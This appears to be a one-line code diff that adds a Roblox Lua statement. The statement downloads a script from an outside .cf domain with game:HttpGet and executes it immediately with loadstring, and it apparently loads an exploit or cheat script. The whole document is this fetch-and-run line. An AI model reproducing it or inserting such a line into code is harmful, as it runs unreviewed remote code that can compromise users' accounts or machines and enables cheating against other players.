@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://versus-airlines.cf/V3/Loader.lua"))()
